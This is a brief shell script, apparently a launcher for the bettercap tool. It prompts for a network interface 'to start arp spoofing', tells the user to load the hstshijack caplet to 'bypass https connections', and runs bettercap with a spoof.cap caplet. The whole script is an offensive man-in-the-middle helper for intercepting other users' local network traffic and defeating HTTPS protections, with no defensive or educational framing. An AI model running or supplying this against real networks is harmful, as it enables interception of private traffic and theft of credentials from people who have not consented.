echo Which interface do you want to start arp spoofing?
read interface
echo After bettercap start you need to type hstshijack/hstshijack to bypass https connections
echo 
echo 
echo 
echo 
bettercap -iface $interface -caplet spoof.cap
